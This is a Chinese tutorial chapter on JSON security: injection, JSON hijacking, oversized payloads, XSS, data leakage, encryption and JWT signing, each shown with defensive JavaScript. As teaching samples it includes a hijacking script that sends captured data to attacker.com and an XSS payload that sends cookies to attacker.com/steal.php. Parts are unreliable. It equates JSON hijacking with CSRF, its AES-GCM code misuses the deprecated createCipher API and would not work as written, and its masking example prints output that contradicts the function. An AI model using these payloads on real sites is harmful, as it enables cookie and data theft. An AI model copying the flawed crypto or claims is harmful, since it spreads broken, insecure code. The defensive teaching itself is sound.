# 6.1 JSON安全考虑

## JSON安全概述

随着JSON在Web应用、API和配置文件中的广泛使用，安全问题变得日益重要。JSON安全主要涉及数据完整性、隐私保护和防止各种攻击。本章将探讨JSON使用中的安全风险和防护措施。

## JSON注入攻击

### 1. JSON注入简介

JSON注入是一种攻击技术，攻击者通过在JSON数据中注入恶意内容，可能导致应用程序解析错误、数据泄露或执行未授权操作。

### 2. JSON注入的类型

#### 数据注入

攻击者通过注入额外的JSON数据改变预期结构：

```json
// 预期的JSON输入
{
  "username": "张三",
  "role": "user"
}

// 恶意注入的JSON输入
{
  "username": "张三",
  "role": "user",
  "isAdmin": true  // 注入额外的权限字段
}
```

#### 语法注入

攻击者通过注入JSON语法字符破坏JSON结构：

```json
// 预期的JSON输入（作为字符串）
"{\"username\": \"张三\", \"role\": \"user\"}"

// 恶意注入（作为字符串）
"{\"username\": \"张三\", \"role\": \"user\"} {\"isAdmin\": true}"
```

#### 回调注入

攻击者通过注入JSONP回调函数名执行恶意代码：

```json
// 正常的JSONP请求
https://api.example.com/data?callback=processData

// 恶意注入的JSONP请求
https://api.example.com/data?callback=alert(document.cookie)
```

### 3. JSON注入防护

#### 输入验证

```javascript
// 输入验证函数
function validateJsonInput(input, allowedFields) {
  // 解析JSON
  let data;
  try {
    data = JSON.parse(input);
  } catch (e) {
    throw new Error("无效的JSON格式");
  }
  
  // 检查字段
  for (const field in data) {
    if (!allowedFields.includes(field)) {
      throw new Error(`不允许的字段: ${field}`);
    }
  }
  
  return data;
}

// 使用示例
const allowedFields = ["username", "role"];
const userInput = '{"username": "张三", "role": "user", "isAdmin": true}';

try {
  const validData = validateJsonInput(userInput, allowedFields);
  console.log("验证通过:", validData);
} catch (error) {
  console.error("验证失败:", error.message);
  // 输出：验证失败: 不允许的字段: isAdmin
}
```

#### 输出编码

```javascript
// JSON输出编码
function safeJsonStringify(data) {
  // 创建白名单字段的对象副本
  const safeData = {};
  const allowedFields = ["username", "role", "email"];
  
  for (const field of allowedFields) {
    if (data[field] !== undefined) {
      safeData[field] = data[field];
    }
  }
  
  return JSON.stringify(safeData);
}

// 使用示例
const userData = {
  username: "张三",
  role: "user",
  email: "zhangsan@example.com",
  password: "secret123",  // 敏感字段将被过滤
  isAdmin: true          // 敏感字段将被过滤
};

const safeJson = safeJsonStringify(userData);
console.log(safeJson);
// 输出：{"username":"张三","role":"user","email":"zhangsan@example.com"}
```

## JSON劫持攻击

### 1. JSON劫持简介

JSON劫持（也称为CSRF，跨站请求伪造）是一种攻击技术，攻击者通过恶意网站获取用户在其他网站上的JSON数据。

### 2. JSON劫持的原理

```javascript
// 恶意网站上的脚本
<script>
  // 重写Array构造函数以捕获数据
  const originalArray = Array;
  Array = function() {
    const arr = originalArray.apply(this, arguments);
    
    // 发送数据到攻击者服务器
    fetch('https://attacker.com/steal', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        stolenData: arr
      })
    });
    
    return arr;
  };
</script>

<!-- 加载目标网站的JSON数据 -->
<script src="https://bank.example.com/api/user/accounts.json"></script>
```

### 3. JSON劫持防护

#### 使用CSRF令牌

```javascript
// 客户端发送带CSRF令牌的请求
async function fetchUserData() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
  
  const response = await fetch('/api/user/data', {
    method: 'GET',
    headers: {
      'X-CSRF-Token': csrfToken
    }
  });
  
  return response.json();
}

// 服务器端验证CSRF令牌（伪代码）
app.get('/api/user/data', (req, res) => {
  const csrfToken = req.headers['x-csrf-token'];
  
  if (!validateCsrfToken(csrfToken, req.session.csrfToken)) {
    return res.status(403).json({ error: 'CSRF token validation failed' });
  }
  
  // 返回用户数据
  res.json(userData);
});
```

#### 使用非数组格式

```javascript
// 返回非数组格式的数据
{
  "accounts": {
    "12345": {
      "type": "checking",
      "balance": 15000
    },
    "67890": {
      "type": "savings",
      "balance": 25000
    }
  }
}

// 或者包装在对象中
{
  "response": {
    "status": "success",
    "data": {
      "accounts": [
        {
          "type": "checking",
          "balance": 15000
        }
      ]
    }
  }
}
```

#### 前缀防护

```javascript
// 在JSON响应前添加前缀
const jsonpResponse = ")]}',\n" + JSON.stringify(userData);

// 或者添加注释
const commentedJson = `/* ${Date.now()} */` + JSON.stringify(userData);

// 客户端处理前缀
function safeJsonParse(jsonString) {
  // 移除JSON前缀
  const cleanJson = jsonString.replace(/^\)\]\}',\n/, '').replace(/^\/\* \d+ \*\/\s*/, '');
  return JSON.parse(cleanJson);
}
```

## 大型JSON安全风险

### 1. 内存耗尽攻击

攻击者通过发送大型JSON数据导致服务器内存耗尽：

```json
// 恶意的大型JSON（示例）
{
  "data": "x".repeat(100000000),  // 100MB的字符串
  "nested": {
    "level1": {
      "level2": {
        // 深度嵌套导致解析栈溢出
        "level100": {
          "largeArray": Array(1000000).fill("malicious")
        }
      }
    }
  }
}
```

### 2. 防护措施

#### 大小限制

```javascript
// Node.js示例：限制请求体大小
const express = require('express');
const bodyParser = require('body-parser');

const app = express();

// 限制JSON请求体大小为1MB
app.use(bodyParser.json({
  limit: '1mb'
}));

// 或者在解析前手动检查
app.use(express.json({
  verify: (req, res, buf) => {
    if (buf.length > 1024 * 1024) {  // 1MB
      return res.status(413).json({ error: '请求体过大' });
    }
  }
}));
```

#### 深度限制

```javascript
// 限制JSON解析深度
function safeJsonParse(jsonString, maxDepth = 10) {
  let depth = 0;
  
  // 自定义解析函数跟踪深度
  function parseValue(value) {
    if (typeof value === 'object' && value !== null) {
      depth++;
      if (depth > maxDepth) {
        throw new Error(`JSON嵌套深度超过限制: ${maxDepth}`);
      }
      
      if (Array.isArray(value)) {
        for (let i = 0; i < value.length; i++) {
          parseValue(value[i]);
        }
      } else {
        for (const key in value) {
          if (value.hasOwnProperty(key)) {
            parseValue(value[key]);
          }
        }
      }
      
      depth--;
    }
    
    return value;
  }
  
  try {
    const parsed = JSON.parse(jsonString);
    parseValue(parsed);
    return parsed;
  } catch (e) {
    throw new Error(`JSON解析失败: ${e.message}`);
  }
}

// 使用示例
const largeNestedJson = '{"a": {"b": {"c": {"d": {"e": "value"}}}}}';
try {
  const result = safeJsonParse(largeNestedJson, 3);  // 设置最大深度为3
  console.log(result);
} catch (error) {
  console.error(error.message);  // 输出：JSON嵌套深度超过限制: 3
}
```

## JSON与XSS攻击

### 1. JSON中的XSS风险

当JSON数据直接插入HTML页面而不进行适当转义时，可能导致XSS攻击：

```json
{
  "userInput": "<script>alert('XSS攻击')</script>",
  "username": "<img src=x onerror=alert('XSS攻击')>",
  "comment": "这是一个评论<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
}
```

### 2. XSS防护

#### 内容转义

```javascript
// HTML转义函数
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// 安全渲染JSON数据
function renderUserData(userData) {
  // 转义用户输入
  const safeUsername = escapeHtml(userData.username);
  const safeComment = escapeHtml(userData.comment);
  
  // 安全地插入HTML
  const userHtml = `
    <div class="user">
      <h3>${safeUsername}</h3>
      <p>${safeComment}</p>
    </div>
  `;
  
  document.getElementById('user-container').innerHTML = userHtml;
}

// 使用示例
const userData = {
  username: "<img src=x onerror=alert('XSS攻击')>",
  comment: "这是一个评论<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
};

renderUserData(userData);  // 安全渲染，不会执行恶意脚本
```

#### 使用textContent而非innerHTML

```javascript
// 安全的DOM操作
function safeRenderUserData(userData) {
  const userDiv = document.createElement('div');
  userDiv.className = 'user';
  
  const usernameElement = document.createElement('h3');
  usernameElement.textContent = userData.username;  // 使用textContent，不会解析HTML
  
  const commentElement = document.createElement('p');
  commentElement.textContent = userData.comment;
  
  userDiv.appendChild(usernameElement);
  userDiv.appendChild(commentElement);
  
  document.getElementById('user-container').appendChild(userDiv);
}

// 使用示例
const userData = {
  username: "<img src=x onerror=alert('XSS攻击')>",
  comment: "这是一个评论<script>alert('XSS')</script>"
};

safeRenderUserData(userData);  // 安全渲染，不会执行恶意脚本
```

## JSON与敏感数据泄露

### 1. 敏感数据风险

不当处理JSON可能导致敏感数据泄露：

```json
{
  "user": {
    "id": "user_123",
    "name": "张三",
    "email": "zhangsan@example.com",
    "password": "hashed_password",  // 不应该返回
    "creditCard": "4532-1234-5678-9012",  // 不应该返回
    "ssn": "123-45-6789",  // 不应该返回
    "address": {
      "street": "人民路123号",
      "city": "北京",
      "zipCode": "100000"
    },
    "internalNotes": "用户有投诉历史"  // 不应该返回
  }
}
```

### 2. 敏感数据防护

#### 数据过滤

```javascript
// 数据过滤函数
function filterSensitiveData(data, userRole) {
  // 定义角色权限
  const permissions = {
    admin: ['id', 'name', 'email', 'address'],
    user: ['id', 'name', 'email'],
    guest: ['id']
  };
  
  // 获取当前角色允许的字段
  const allowedFields = permissions[userRole] || permissions.guest;
  
  // 递归过滤数据
  function filterObject(obj, allowedFields) {
    const result = {};
    
    for (const field of allowedFields) {
      if (obj[field] !== undefined) {
        if (typeof obj[field] === 'object' && obj[field] !== null && !Array.isArray(obj[field])) {
          // 对于嵌套对象，使用所有允许的子字段
          result[field] = obj[field];  // 简化处理，实际应用中可能需要更复杂的逻辑
        } else {
          result[field] = obj[field];
        }
      }
    }
    
    return result;
  }
  
  return filterObject(data, allowedFields);
}

// 使用示例
const userData = {
  id: "user_123",
  name: "张三",
  email: "zhangsan@example.com",
  password: "hashed_password",
  creditCard: "4532-1234-5678-9012",
  address: {
    street: "人民路123号",
    city: "北京",
    zipCode: "100000"
  }
};

// 管理员看到更多字段
const adminView = filterSensitiveData(userData, 'admin');
console.log("管理员视图:", adminView);

// 普通用户看到的字段更少
const userView = filterSensitiveData(userData, 'user');
console.log("用户视图:", userView);
```

#### 字段遮蔽

```javascript
// 敏感字段遮蔽
function maskSensitiveFields(data, sensitiveFields, maskChar = '*') {
  const result = JSON.parse(JSON.stringify(data));  // 深拷贝
  
  function traverse(obj) {
    if (typeof obj !== 'object' || obj === null) {
      return;
    }
    
    for (const field in obj) {
      if (obj.hasOwnProperty(field)) {
        // 检查是否是敏感字段
        if (sensitiveFields.some(sf => field.toLowerCase().includes(sf.toLowerCase()))) {
          // 遮蔽字段值
          if (typeof obj[field] === 'string') {
            // 保留前几个字符，其余遮蔽
            if (obj[field].length > 4) {
              obj[field] = obj[field].substring(0, 4) + maskChar.repeat(obj[field].length - 4);
            } else {
              obj[field] = maskChar.repeat(obj[field].length);
            }
          } else {
            obj[field] = maskChar.repeat(8);
          }
        } else if (typeof obj[field] === 'object') {
          traverse(obj[field]);
        }
      }
    }
  }
  
  traverse(result);
  return result;
}

// 使用示例
const sensitiveData = {
  username: "zhangsan",
  password: "securePassword123",
  email: "zhangsan@example.com",
  creditCard: "4532-1234-5678-9012",
  ssn: "123-45-6789"
};

const maskedData = maskSensitiveFields(sensitiveData, ['password', 'creditCard', 'ssn']);
console.log("遮蔽后的数据:", maskedData);
// 输出：{
//   username: "zhangsan",
//   password: "*************",
//   email: "zhangsan@example.com",
//   creditCard: "4532************",
//   ssn: "123-********"
// }
```

## JSON与加密与签名

### 1. JSON加密

对敏感JSON数据进行加密保护：

```javascript
// 简单的加密示例（实际应用中应使用更安全的加密方法）
const crypto = require('crypto');

// 加密函数
function encryptJson(data, password) {
  const algorithm = 'aes-256-gcm';
  const salt = crypto.randomBytes(32);
  const iv = crypto.randomBytes(16);
  
  // 派生密钥
  const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256');
  
  // 创建加密器
  const cipher = crypto.createCipher(algorithm, key, iv);
  
  // 加密数据
  const encrypted = Buffer.concat([
    cipher.update(JSON.stringify(data), 'utf8'),
    cipher.final()
  ]);
  
  const tag = cipher.getAuthTag();
  
  return {
    encrypted: encrypted.toString('base64'),
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
    tag: tag.toString('base64')
  };
}

// 解密函数
function decryptJson(encryptedData, password) {
  const algorithm = 'aes-256-gcm';
  const encrypted = Buffer.from(encryptedData.encrypted, 'base64');
  const salt = Buffer.from(encryptedData.salt, 'base64');
  const iv = Buffer.from(encryptedData.iv, 'base64');
  const tag = Buffer.from(encryptedData.tag, 'base64');
  
  // 派生密钥
  const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256');
  
  // 创建解密器
  const decipher = crypto.createDecipher(algorithm, key, iv);
  decipher.setAuthTag(tag);
  
  // 解密数据
  const decrypted = Buffer.concat([
    decipher.update(encrypted),
    decipher.final()
  ]);
  
  return JSON.parse(decrypted.toString('utf8'));
}

// 使用示例
const sensitiveData = {
  username: "zhangsan",
  password: "securePassword123",
  ssn: "123-45-6789"
};

const password = 'mySecretPassword';
const encrypted = encryptJson(sensitiveData, password);
console.log("加密数据:", encrypted);

const decrypted = decryptJson(encrypted, password);
console.log("解密数据:", decrypted);
```

### 2. JSON签名

对JSON数据进行数字签名以确保完整性和真实性：

```javascript
// JSON Web Token (JWT) 示例
const jwt = require('jsonwebtoken');

// 创建JWT
function createSignedToken(payload, secretKey) {
  return jwt.sign(payload, secretKey, { expiresIn: '1h' });
}

// 验证JWT
function verifySignedToken(token, secretKey) {
  try {
    return jwt.verify(token, secretKey);
  } catch (error) {
    console.error("JWT验证失败:", error.message);
    return null;
  }
}

// 使用示例
const userData = {
  userId: "user_123",
  username: "zhangsan",
  role: "user"
};

const secretKey = 'mySecretKey';
const token = createSignedToken(userData, secretKey);
console.log("JWT令牌:", token);

// 稍后验证令牌
const verifiedData = verifySignedToken(token, secretKey);
if (verifiedData) {
  console.log("验证成功，数据:", verifiedData);
} else {
  console.log("验证失败");
}
```

## 实验环节：JSON安全实践

### 实验1：构建安全JSON处理器

构建一个安全的JSON处理器，包含：

1. 输入验证
2. 深度限制
3. 大小限制
4. 字段过滤
5. 敏感数据遮蔽

### 实验2：JSON注入检测器

创建一个JSON注入检测器，能够识别：

1. 数据注入尝试
2. 语法注入尝试
3. 回调注入尝试
4. 恶意JSON载荷

### 实验3：安全JSON API设计

设计一个安全的JSON API，实现：

1. 请求验证
2. 响应过滤
3. CSRF保护
4. 速率限制
5. 错误处理

## 小结

本节我们深入探讨了JSON安全考虑：

1. **JSON注入攻击**：
   - 数据注入、语法注入、回调注入
   - 输入验证和输出编码作为防护措施

2. **JSON劫持攻击**：
   - 原理和防护措施
   - CSRF令牌、非数组格式、前缀防护

3. **大型JSON安全风险**：
   - 内存耗尽攻击
   - 大小限制和深度限制

4. **JSON与XSS攻击**：
   - 风险和防护措施
   - 内容转义和安全DOM操作

5. **JSON与敏感数据泄露**：
   - 风险和防护措施
   - 数据过滤和字段遮蔽

6. **JSON与加密与签名**：
   - 加密和签名实现
   - JWT令牌示例

了解这些安全风险和防护措施，可以帮助我们构建更安全、更可靠的JSON处理系统。在下一节中，我们将探讨JSON性能优化与最佳实践，了解如何高效地使用JSON。

## 代码示例

请查看`code/chapter6/security`目录，其中包含了：

1. `input_validation.js` - JSON输入验证示例
2. `output_encoding.js` - JSON输出编码示例
3. `csrf_protection.js` - CSRF保护示例
4. `large_json_protection.js` - 大型JSON防护示例
5. `xss_protection.js` - XSS防护示例
6. `sensitive_data_filter.js` - 敏感数据过滤示例
7. `data_masking.js` - 数据遮蔽示例
8. `json_encryption.js` - JSON加密示例
9. `json_signing.js` - JSON签名示例
10. `secure_json_processor.js` - 安全JSON处理器示例
11. `json_injection_detector.js` - JSON注入检测器示例
12. `secure_api_example.js` - 安全JSON API示例